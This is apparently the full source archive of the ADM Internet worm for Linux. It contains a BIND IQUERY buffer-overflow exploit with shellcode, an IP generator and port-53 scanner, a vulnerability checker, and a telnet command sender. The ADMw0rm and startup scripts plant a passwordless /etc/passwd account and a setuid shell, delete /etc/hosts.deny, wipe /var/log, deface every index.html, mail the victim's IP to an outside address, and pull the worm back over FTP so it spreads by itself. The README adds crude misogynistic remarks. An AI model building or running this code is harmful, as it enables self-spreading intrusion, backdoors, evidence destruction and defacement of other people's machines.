   w0rm/ 40755      0      0           0  6527421333   7732 5ustar  rootrootw0rm/incremental100755      0      0        1375  6526157272  12273 0ustar  rootroot#!/bin/sh
   declare -i A
   declare -i B
   declare -i C
   declare -i D

   read ARGV

   A=`echo $ARGV|cut -d. -f 1`
   B=`echo $ARGV|cut -d. -f 2`
   C=`echo $ARGV|cut -d. -f 3`
   D=`echo $ARGV|cut -d. -f 4`

           echo "$A.$B.$C.$D"


   while true
   do

   if [  "$A" -ge "229" ]
   then
     A=1
   fi

   while [ "$A" -lt "230" ]
   do
       if [ "$B" -ge "229" ]
           then
           B=0
           fi

       while [ "$B" -lt "230" ]
       do

            if [  "$C" -ge "229" ]
            then
                C=0
                fi

           while [ "$C" -lt "230" ]
               do

                   if [  "$D" -ge "229" ]
                       then
                       D=0
                    fi

               while [ "$D" -lt "230" ]
               do

                     D=D+1
                     echo "$A.$B.$C.$D"
                   done
                C=C+1
               done
            B=B+1
        done
    A=A+1
   done

   done

      w0rm/gimmeIP100755      0      0        1041  6525360155  11302 0ustar  rootroot#!/bin/sh
   PATH="/usr/bin:/bin:/usr/local/bin/:/usr/sbin/:/sbin"
   export PATH

   route -n | while read A
   do

   GW=`echo $A | awk '{printf("%s",$1)}'`

   if [ $GW = "0.0.0.0" ]
   then

   IFACE=`echo $A | awk '{printf("%s",$8)}'`

   ifconfig $IFACE | while read B
        do
         CMP=`echo $B | awk '{printf("%s",$1)}'`
         if [ $CMP = "inet" ]
            then
            MYIP=`echo $B | cut -d: -f 2 | awk '{printf("%s",$1)}'`
           # echo "my default iface is $IFACE and my ip is $MYIP"
            echo $MYIP
            exit
         fi
      done

   fi
   done
   w0rm/README100644      0      0        1463  6527421333  10713 0ustar  rootroot
                         ___      ______      _       _
                       /     \   |   _   \   |  \   /  |
                      |  / \  |  |  |  \  |  |   \_/   |
                      | |___| |  |  |_ /  |  |   \_/   |
   ..oO  THE          |  ---  |  |       /   |  |   |  |         CreW Oo..
                      '''   '''   '''''''    ''''   ''''
                                  presents

   the adm inet w0rm...

   the w0rm is a linux/x86 spef he exploit the  bind/iquery vuln

   no help allowed just look   ADMw0rm and startup ....

   take care about one  things!!! dont launch  the w0rm on your box
   cuz  he create a big  security problem.... :p
   it's just for educational purpose of coursseeeeeeeeeeee


   Cyaaaaaaaaaaaaaaaaaaaaaaaaaa


   Sweden  chix has born to  be fuck

     --3xF--
   find   'em
   fuck   'em
   forget 'em
     --3xF--
   w0rm/gimmeRAND.c100644      0      0         472  6526322173  11722 0ustar  rootroot #include <stdio.h>
    #include <time.h>
    #include <stdlib.h>

   int myrand()
   {
    int j;
     j=1+(int) (230.0*rand()/(RAND_MAX+1.0));
     return(j);
    }

    void main  () {
    int i;

    srand((time(NULL)*rand()));

    for (i = 0; i < 3; i ++ )
         printf("%i.",myrand());

    printf("%i\n",myrand());
   }



   w0rm/scanconnect.c100644      0      0        2713  6526321416  12474 0ustar  rootroot/*
   scannconect scan for the port 53
   read the host from the stdin
   the code come at 90% from a imap checker proggie
   anyway it's come from ADM too hehe =)
   */

   #define PROJECT          "ADM internet w0rm project"

   #define MAXCHILD        20

   #define CONNECT_TIMEOUT     10

   #define PORT                53

   #include <sys/socket.h>
   #include <netinet/in.h>
   #include <arpa/inet.h>
   #include <signal.h>
   #include <string.h>
   #include <malloc.h>
   #include <stdio.h>
   #include <sys/time.h>
   #include <sys/types.h>
   #include <unistd.h>

   pid_t wait(int *status);

   int sock;
   char *flowbuf;

   void connect_read_timeout() {
       close(sock);
   }

   void checkout(struct in_addr ip) {
       struct sockaddr_in sa;


       memset(&sa, 0, sizeof(sa));
       memcpy(&sa.sin_addr, &ip, 4);
       sa.sin_port = htons(PORT);

       if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
           exit(0);

       signal(SIGALRM, connect_read_timeout);
       alarm(CONNECT_TIMEOUT);
       if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
           alarm(0); close(sock);
           exit(0);
       }
       alarm(0);
           printf("%s\n",inet_ntoa(ip));
       exit(0);
   }

   void main() {
       char ipS[256];
       struct in_addr ip;
       int childs = 0;

       while (fgets(ipS, sizeof(ipS), stdin) != NULL)
           if (inet_aton(ipS, &ip) != 0 && ip.s_addr != 0) {
               if (childs >= MAXCHILD) wait(NULL);
               switch (fork()) {
                   case 0:
                       checkout(ip);
                       exit(0);
                   case -1:
                       perror("fork");
                       exit(-1);
                   default:
                       childs++;
                       break;
               }
           }
       while (childs--) wait(NULL);

       return;
   }
   w0rm/remotecmd.c100644      0      0       10002  6522332004  12152 0ustar  rootroot/***************************************/
   /* remotecmd.c (c) ADM                 */
   /* do a non interactive telnet session */
   /* -==* ADM internet w0rm project *==- */
   /***************************************/

   /**************************************************/
   /* usage: remotecmd <victim> [filename] [time]    */
   /* <victim>   : heheh The Victim ~!#!@ :)         */
   /* [filename] : per default the file with the cmd */
   /*              is "./cmd" u can change it :)     */
   /* [time]     : time to sleep bitwin the cmd      */
   /*              (in microseconds)                 */
   /**************************************************/


   /********** cmd file example  **********/
   /*
      ** $ cat > cmd
      ** pooruser
      ** poorpasswd
      ** touch /tmp/netg_sistah_is_mine
      ** logout
      ** [Ctrl^D]
      ** $
    */
   /* fun isnt it ? :pp */

   /* The Infamous Define !! */

   #define VERSION          "ADM remote commander 1.0 pub (c) ADM"
   #define PROJECT          "ADM internet w0rm project"
   #define OFFICIAL_ADM_GAL "Netguru Sister!$#"
   #define LOVE              OFFICIAL_ADM_GAL
   #define THINGS            "i lost my time #%$!#%"
   #define SOMETHING         "Mais je l'aime steu CONNE!!"


   /* hehe the include is not so bad %-) */
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   #include <fcntl.h>
   #include <sys/types.h>
   #include <sys/socket.h>
   #include <sys/wait.h>
   #include <sys/ioctl.h>
   #include <sys/stat.h>
   #include <netdb.h>
   #include <netinet/in.h>


   void *memset (void *s, int c, size_t n);
   void bzero (void *s, int n);
   void usleep (unsigned long usec);
   void dacmd (int, char *);
   void usage (char *);
   char *strcpy (char *dest, const char *src);
   int ADMtelnet (u_long);
   u_long host2ip (char *);


   char FILE_CMD_NAME[1024] = "cmd";
   u_long TIMEMETHAT = 500000;


   void
   main (int argc, char **argv)
   {
     /* bla */
     if (argc < 2)
       usage (argv[0]);
     if (argc > 2)
       strcpy (FILE_CMD_NAME, argv[2]);
     if (argc > 3)
       TIMEMETHAT = atoi (argv[3]);

     ADMtelnet (host2ip (argv[1]));
   }

   void
   usage (char *c)
   {
     fprintf (stderr, "-==* The ADM CreW *==-\n");
     fprintf (stderr, "usage  :%s <victim> [filename] [time in microsecond]\n", c);
     fprintf (stderr, "example: remotecmd www.h0h0.com ~root/cmdfile 500000\n");
     fprintf (stderr, "*** filename per default is cmd ***\n");
     fprintf (stderr, "*** time per defaulf is 500000 *** \n");
     exit (-1);
   }

   unsigned long
   host2ip (char *serv)
   {
     struct sockaddr_in sinn;
     struct hostent *hent;

     hent = gethostbyname (serv);
     if (hent == NULL)
       return 0;
     bzero ((char *) &sinn, sizeof (sinn));
     memcpy ((char *) &sinn.sin_addr, hent->h_addr, hent->h_length);
     return sinn.sin_addr.s_addr;
   }


   /* diz function read the cmd from a file */
   /* and he sent it over the socket        */

   void
   dacmd (int s, char *filename)
   {
     FILE *filez;
     char tmp[255];
     bzero (tmp, sizeof (tmp));
     filez = fopen (filename, "r");

     while (!feof (filez))
       {
         fgets (tmp, sizeof (tmp), filez);
         printf (":%s<", tmp);
         write (s, tmp, strlen (tmp));
         usleep (TIMEMETHAT);
         bzero (tmp, sizeof (tmp));
       }
   }

   /*  make a telnet connection */

   int
   ADMtelnet (u_long ip)
   {
     struct sockaddr_in sin;
     u_char buf[4000];
     int dasock, len;
     int longueur = sizeof (struct sockaddr_in);


     dasock = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);  /* gimme a socket */

     sin.sin_family = AF_INET;
     sin.sin_port = htons (23);
     sin.sin_addr.s_addr = ip;

     if (connect (dasock, (struct sockaddr *) &sin, longueur) == -1)
       return (-1);

     while (1)
       {
         memset (buf, 0, sizeof (buf));

         if ((len = read (dasock, buf, 1)) <= 0)
       break;

         if (*buf == (unsigned int) 255)
       {
         read (dasock, (buf + 1), 2);
         if (*(buf + 1) == (unsigned int) 253 && !(u_char) * (buf + 2));
         else if ((u_char) * (buf + 1) == (unsigned int) 253)
           {
             *(buf + 1) = 252;
             write (dasock, buf, 3);
           }
       }
         else
       {
         if (*buf != 0)
           {
             bzero (buf, sizeof (buf));
             read (dasock, buf, sizeof (buf));
             dacmd (dasock, FILE_CMD_NAME);
             sleep (1);
             return 1;
           }

       }

       }
     return 0;
   }
   w0rm/named_ADMv2.c100644      0      0       13404  6526321722  12232 0ustar  rootroot/*
      ___      ______      _       _
      /     \   |   _   \   |  \   /  |
      |  / \  |  |  |  \  |  |   \_/   |
      | |___| |  |  |_ /  |  |   \_/   |
      ..oO  THE          |  ---  |  |       /   |  |   |  |         CreW Oo..
      '''   '''   '''''''    ''''   ''''
      presents
      named remote overflow sploits
      x86    linux

      ps: we are not the first guyz who have write the sploits but like nobody
      wanna give it to us we've make our own sploit ;) *celebrate*! :)

      ripped a lot from the vuln test proggies of
      Joshua J. Drake (jdrake@pulsar.net)
      thx to him :)
    */


   #define NOP 0x90

   #include <stdio.h>
   #include <unistd.h>
   #include <stdlib.h>
   #include <signal.h>
   #include <time.h>
   #include <string.h>
   #include <ctype.h>
   #include <sys/types.h>
   #include <sys/socket.h>
   #include <netinet/in.h>
   #include <arpa/inet.h>
   #include <arpa/nameser.h>
   #include <netdb.h>
   #include <getopt.h>


   void handle_alarm ();
   int lookup_host ();
   void attack_bind ();
   int make_keypkt ();
   int send_packet ();
   void usage ();

   char buff[10000];


   char basecode1[100] = "\x5e\x31\xc0\xb0";

   char basecode2[500] = "\x89\xf7\x29\xc7\x89\xf3\x89"
   "\xf9\x89\xf2\xac\x3c\xfe\x74\x10\xfe\xc0\x75\xf7\x88\x46\xff\x89\x17\x89"
   "\xf2\x83\xc7\x04\xeb\xeb\x31\xc0\xab\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\x40"
   "\xcd\x80\xe8\xc9\xff\xff\xff";


   char shellcode[500];


   void
   addchar (char *str, char ch)
   {
     unsigned int len;

     len = strlen (str);
     str[len] = ch;
     str[len + 1] = 0;
   }



   void
   usage (char *prog)
   {
     printf ("--= The ADM CreW =--\n"
         "%s victim arg0 arg1 ...\n"
         "ex:sploits www.juergen.ch /usr/X11R6/bin/xterm"
         " -display ppp666.hax0r.com:0\n"
         ,prog);
     exit (0);
   }


   void
   main (argc, argv)
        int argc;
        char *argv[];
   {
     int i;
     struct sockaddr_in ra;
     char *ptr;
     char *endbuff;
     unsigned long addr;
     unsigned char jmp;

     int offset = 2700;        /* 2200 --> 3500 */
     int bsize = 1536;


     if (strstr (argv[1], "-h"))
       usage (argv[0]);

     strcpy (shellcode, "\xeb");

     if ((argc - 2) < 5)
       jmp = 0x32;
     else
       jmp = 0x32 + ((argc - 2 - 4) * 4);

     addchar (shellcode, jmp);

     for (i = 4; i < (argc - 2); i++)
       strcat (shellcode, "1234");

     strcat (shellcode, basecode1);

     if ((argc - 2) < 5)
       jmp = 0x39;
     else
       jmp = 0x39 + ((argc - 2 - 4) * 4);

     addchar (shellcode, jmp);

     strcat (shellcode, basecode2);

     for (i = 2; i < argc; i++)
       {
         strcat (shellcode, argv[i]);
         strcat (shellcode, "\xff");
       }
     strcat (shellcode, "\xfe");

     addr = 0xbffffff0 - offset;

     printf ("buffer size set to %i\n", bsize);
     printf ("offset set to %i\n", offset);
     printf ("using address: 0x%lx\n", addr);

     endbuff = buff + bsize;

     for (ptr = buff; ptr < (endbuff - strlen (shellcode) - 8); ptr++)
       *ptr = NOP;
     for (i = 0; i < strlen (shellcode); i++)
       *(ptr++) = shellcode[i];
     *((long *) ptr) = addr - 16;
     *((long *) (ptr + 4)) = addr;
     *(ptr + 9) = 0;

     if (!lookup_host (&ra, argv[1], NAMESERVER_PORT))
       return;

     srand (time (NULL));
     attack_bind (ra);
   }

   int
   lookup_host (ra, hn, rp)
        struct sockaddr_in *ra;
        char *hn;
        unsigned short rp;
   {
     ra->sin_family = AF_INET;
     ra->sin_port = htons (rp);
     if ((ra->sin_addr.s_addr = inet_addr (hn)) == -1)
       {
         struct hostent *he;

         if ((he = gethostbyname (hn)) != (struct hostent *) NULL)
       {
         memcpy (&ra->sin_addr.s_addr, he->h_addr, 4);
         return 1;
       }
         else
       herror ("Unable to resolve hostname");
       }
     else
       return 1;
     return 0;
   }

   void
   attack_bind (ra)
        struct sockaddr_in ra;
   {
     int sd, pktlen;
     char keypkt[6000],  rname[6000];
     struct hostent *he;


     if ((sd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
       {
         perror ("cannot open tcp socket");
         return;
       }
     printf ("Connecting to nameserver via TCP..");
     fflush (stdout);
     signal (SIGALRM, handle_alarm);
     alarm (15);
     if (connect (sd, (struct sockaddr *) &ra, sizeof (ra)) == -1)
       {
         perror ("Unable to connect");
         close (sd);
         return;
       }
     printf (".done.\n");
     alarm (0);

     if ((he = gethostbyaddr ((char *) &ra.sin_addr, sizeof (ra.sin_addr), AF_INET)) == (struct hostent *) NULL)
       sprintf (rname, "%s", inet_ntoa (ra.sin_addr));
     else
       strncpy (rname, he->h_name, sizeof (rname));



     pktlen = make_keypkt (keypkt);
     send_packet (sd, keypkt, pktlen);
     printf ("u hax0r\n");
     close (sd);
     exit (-1);

   }

   void
   handle_alarm (sn)
        int sn;
   {
     alarm (0);
     signal (SIGALRM, SIG_DFL);
     printf ("Unable to connect: Connection timed out\n");
     exit (0);
   }

   int
   make_keypkt (pktbuf)
        char *pktbuf;
   {
     HEADER *dnsh;
     char *ptr = pktbuf;
     int pktlen = 0;
     unsigned long ttl = 31337;


     memset (pktbuf, 0, sizeof (pktbuf));

   /* fill the dns header */
     dnsh = (HEADER *) ptr;
     dnsh->id = htons (rand () % 65535);
     dnsh->qr = 0;
     dnsh->opcode = IQUERY;
     dnsh->aa = 0;
     dnsh->tc = 0;
     dnsh->rd = 1;
     dnsh->ra = 1;
     dnsh->unused = 0;
   /* removed for portability (it's zero already)
      dnsh->pr             = 0;
    */
     dnsh->rcode = 0;
     dnsh->qdcount = htons (0);
     dnsh->ancount = htons (1);
     dnsh->nscount = htons (0);
     dnsh->arcount = htons (0);
     pktlen += sizeof (HEADER);
     ptr += sizeof (HEADER);
   /* this is the domain name (nothing here) */
     *(ptr++) = '\0';
     pktlen++;
   /* fill out the rest of the rr */

     PUTSHORT (T_A, ptr);
     PUTSHORT (C_IN, ptr);
     PUTLONG (ttl, ptr);
     PUTSHORT ((strlen (buff) + 1), ptr);

     memcpy (ptr + 1, buff, strlen (buff) + 1);
     ptr = ptr + (strlen (buff) + 1);

     pktlen += ((sizeof (short) * 3) + sizeof (long) + (strlen (buff) + 1));

     return pktlen;
   }

   int
   send_packet (sd, pktbuf, pktlen)
        int sd, pktlen;
        char *pktbuf;
   {
     char tmp[2], *tmpptr;

     tmpptr = tmp;
     PUTSHORT (pktlen, tmpptr);
     if (write (sd, tmp, 2) != 2 || write (sd, pktbuf, pktlen) != pktlen)
       {
         perror ("write failed");
         return 0;
       }
     return 1;
   }
   w0rm/ADMw0rm100755      0      0        3275  6526727424  11204 0ustar  rootroot#!/bin/sh
   # ADM Inet w0rm
   # Linux X86 spef..  anyway it's my first w0rm :)
   # ver 0.1
   # i'm not responsable of the usage of diz w0rm !!!
   # greetz: to  all blondes with the short hairs who look's good =), the netg
   # sistah, all of the handrail's i'll slide, all of the sweden chix i'll fuk ;)
   # and The ADM Crew oooooooofffffff course heh
   #          LIFE IS A BITCH, BE HARDCORE WITH 'EM, DONT FINISH LIKE ME !
   # ********************* THE CREW WILL NEVER DIE ***************************

   EMAIL="admsmb@hotmail.com"
   SAY="The ADM Inet w0rm is here !"
   PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
   export PATH


   IP_A=`./gimmeIP`

   cat << _EOF_ > cmd
   w0rm
   /tmp/.w0rm -c "/usr/sbin/named" &
   PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
   export PATH
   echo -e "<html> <body>\n$SAY\n <\html> <\\\body>" > /tmp/.X11x
   cd /tmp/
   mkdir .w0rm0r
   cd .w0rm0r
   if [ -f /tmp/w0rmishere ]
   then
   nohup /tmp/.w0rm -c "/bin/sleep 60;/bin/rm -rf /var/log/* /tmp/.w0rm" &
   logout
   fi
   ftp $IP_A
   w0rm

   cd /tmp/.w0rm0r
   get ADMw0rm.tgz
   bye
   tar xfvz ADMw0rm.tgz
   touch /tmp/w0rmishere
   nohup ./ADMw0rm &
   ./gimmeIP | /bin/mail $EMAIL
   nohup /tmp/.w0rm -c "/bin/sleep 60;/bin/rm -rf /var/log/* /tmp/.w0rm" &
   nohup find / -name "index.html" -exec /bin/cp /tmp/.X11x {} \; &
   logout
   _EOF_


   ./gimmeRAND | ./incremental  | ./scanco  | while read VICTIM
   do
   RESU=`./test $VICTIM 2> /dev/null | awk '{printf("%s",$3)}' 2> /dev/null`

   if [ $RESU = "vulnerable." ]
   then

   echo "lets hack"
   ./Hnamed $VICTIM /bin/sh -c "echo >> /etc/passwd; echo \"w0rm::2666:777:ADM Inet w0rm:/:/bin/sh\" >> /etc/passwd; /bin/cp /bin/sh /tmp/.w0rm; /bin/chmod 4777 /tmp/.w0rm; /bin/rm -f /etc/hosts.deny"
   nohup ./remotecmd $VICTIM cmd 3000000  &
   fi
   done
    w0rm/testvuln.c100644      0      0       10313  6525363364  12104 0ustar  rootroot/*
      tests if vulnerable to overflow for bind (pre 8.1.2 / 4.9.8) named
      nameserver must have fake-iquery option turned on
      written solely by Joshua J. Drake (jdrake@pulsar.net)
   */

   /* local type includes */
   #include <stdio.h>
   #include <unistd.h>
   #include <stdlib.h>
   #include <signal.h>
   #include <time.h>
   #include <string.h>
   #include <ctype.h>
   /* network type includes */
   #include <sys/types.h>
   #include <sys/socket.h>
   #include <netinet/in.h>
   #include <arpa/inet.h>
   #include <arpa/nameser.h>
   #include <netdb.h>

   void handle_alarm();
   int lookup_host();
   void attack_bind();
   int make_keypkt();
   int send_packet();
   int get_packet();
   int vulnerable();

   void
   main(argc, argv)
      int argc;
      char *argv[];
   {
      struct sockaddr_in ra;

      if (argc != 2)
        {
          printf("usage: %s <host>\n", argv[0]);
          return;
        }
      if (!lookup_host(&ra, argv[1], NAMESERVER_PORT))
         return;
      srand(time(NULL));
      attack_bind(ra);
   }

   int
   lookup_host(ra, hn, rp)
      struct sockaddr_in *ra;
      char *hn;
      unsigned short rp;
   {
      ra->sin_family = AF_INET;
      ra->sin_port = htons(rp);
      if ((ra->sin_addr.s_addr = inet_addr(hn)) == -1)
        {
       struct hostent *he;

       if ((he = gethostbyname(hn)) != (struct hostent *)NULL)
         {
            memcpy(&ra->sin_addr.s_addr, he->h_addr, 4);
            return 1;
         }
       else
          herror("Unable to resolve hostname");
        }
      else
         return 1;
      return 0;
   }

   void
   attack_bind(ra)
      struct sockaddr_in ra;
   {
      int sd, pktlen;
      char keypkt[512], inbuf[512], rname[256];
      struct hostent *he;

      if ((sd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
       perror("cannot open tcp socket");
       return;
        }

      fflush(stdout);
      signal(SIGALRM, handle_alarm);
      alarm(15);
      if (connect(sd, (struct sockaddr *)&ra, sizeof(ra)) == -1)
        {
       perror("Unable to connect");
       close(sd);
       return;
        }

      alarm(0);

      if ((he = gethostbyaddr((char *)&ra.sin_addr, sizeof(ra.sin_addr), AF_INET)) == (struct hostent *)NULL)
         sprintf(rname, "%s", inet_ntoa(ra.sin_addr));
      else
         strncpy(rname, he->h_name, sizeof(rname));

      pktlen = make_keypkt(keypkt);
      if (!send_packet(sd, keypkt, pktlen))
         return;
      if (!get_packet(sd, inbuf, &pktlen) || pktlen <= 0)
         return;
      if (vulnerable(inbuf))
         printf("%s is vulnerable.\n", rname);
      else
         printf("%s is not vulnerable.\n", rname);
      close(sd);
   }

   void
   handle_alarm(sn)
      int sn;
   {
      alarm(0);
      signal(SIGALRM, SIG_DFL);
      printf("Unable to connect: Connection timed out\n");
      exit(0);
   }

   int
   make_keypkt(pktbuf)
      char *pktbuf;
   {
      HEADER *dnsh;
      char *ptr = pktbuf;
      int pktlen = 0;
      unsigned long ttl = 31337;
      unsigned long addr = inet_addr("1.2.3.4");

      memset(pktbuf, 0, sizeof(pktbuf));

   /* fill the dns header */
      dnsh = (HEADER *)ptr;
      dnsh->id     = htons(rand()%65535);
      dnsh->qr     = 0;
      dnsh->opcode     = IQUERY;
      dnsh->aa     = 0;
      dnsh->tc     = 0;
      dnsh->rd     = 1;
      dnsh->ra     = 1;
      dnsh->unused     = 0;
   /* removed for portability (it's zero already)
      dnsh->pr     = 0;
    */
      dnsh->rcode      = 0;
      dnsh->qdcount    = htons(0);
      dnsh->ancount    = htons(1);
      dnsh->nscount    = htons(0);
      dnsh->arcount    = htons(0);
      pktlen += sizeof(HEADER);
      ptr += sizeof(HEADER);
   /* this is the domain name (nothing here) */
      *(ptr++) = '\0';
      pktlen++;
   /* fill out the rest of the rr */
      PUTSHORT(T_A, ptr);
      PUTSHORT(C_IN, ptr);
      PUTLONG(ttl, ptr);
      PUTSHORT(4, ptr);
      PUTLONG(addr, ptr);
      ptr += 4;
      pktlen += ((sizeof(short) * 3) + sizeof(long) + 4);

      return pktlen;
   }

   int
   send_packet(sd, pktbuf, pktlen)
      int sd, pktlen;
      char *pktbuf;
   {
      char tmp[2], *tmpptr;

      tmpptr = tmp;
      PUTSHORT(pktlen, tmpptr);
      if (write(sd, tmp, 2) != 2 || write(sd, pktbuf, pktlen) != pktlen)
        {
       perror("write failed");
       return 0;
        }
      return 1;
   }

   int
   get_packet(sd, pktbuf, pktlen)
      int sd, *pktlen;
      char *pktbuf;
   {
      char tmp[2], *tmpptr;

      tmpptr = tmp;
      if (read(sd, tmp, 2) != 2)
        {
       perror("read failed");
       return 0;
        }
      GETSHORT(*pktlen, tmpptr);
      if (read(sd, pktbuf, *pktlen) != *pktlen)
        {
       perror("read failed");
       return 0;
        }
      return 1;
   }

   int
   vulnerable(pktbuf)
      char *pktbuf;
   {
      HEADER *dnsh = (HEADER *)pktbuf;

      if (dnsh->rcode == 0)
         return 1;
      return 0;
   }
   w0rm/startup100755      0      0        1236  6526726267  11476 0ustar  rootroot#!/bin/sh
   PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
   export PATH

   PROGGIES="./test ./Hnamed ./gimmeRAND ./scanco ./remotecmd  ./gimmeIP ./incremental ./ADMw0rm"
   echo "compile the proggies..."
   gcc testvuln.c     -o    ./test
   gcc named_ADMv2.c  -o    ./Hnamed
   gcc gimmeRAND.c    -o    ./gimmeRAND
   gcc scanconnect.c  -o    ./scanco
   gcc remotecmd.c    -o    ./remotecmd
   echo "done..."
   echo "make the ADMw0rm.tgz"
   tar cfvz ADMw0rm.tgz  $PROGGIES
   echo "install the user w0rm.."
   mkdir /tmp/.w0rm0r/
   cp ADMw0rm.tgz /tmp/.w0rm0r/
   echo "w0rm::2666:777:ADM Inet W0rm:/:/bin/sh" >> /etc/passwd
   echo "launch the w0rm!!!"
   nohup ./ADMw0rm  &
   echo "-==* The ADM Crew *==-"
